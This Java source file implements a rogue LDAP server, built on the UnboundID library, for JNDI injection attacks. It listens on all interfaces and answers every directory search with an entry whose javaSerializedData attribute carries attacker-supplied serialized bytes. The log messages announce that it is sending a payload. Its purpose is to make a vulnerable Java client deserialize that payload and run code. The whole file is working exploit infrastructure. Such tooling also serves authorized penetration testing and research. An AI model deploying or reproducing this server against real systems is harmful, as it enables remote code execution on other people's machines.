package com.leixiao;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPServer {
    public static void start(int port,byte[] serializedData) {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor(serializedData));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("[+] LDAP Server starting...");
            System.out.println("[+] Listening on 0.0.0.0:" + port);
            ds.startListening();
        } catch (Exception e) {
            System.err.println("[-] LDAP Server startup failed:");
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private byte[] serializedData = null;

        public OperationInterceptor(byte[] serializedData) {
            this.serializedData = serializedData;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            System.out.println("[+] Received LDAP search request for: " + base);
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                System.err.println("[-] Error processing search result:");
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            System.out.println("[+] Preparing LDAP response...");
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaSerializedData", serializedData);
            
            System.out.println("[+] Sending LDAP response with payload");
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            System.out.println("[+] LDAP response sent successfully");
        }
    }
}
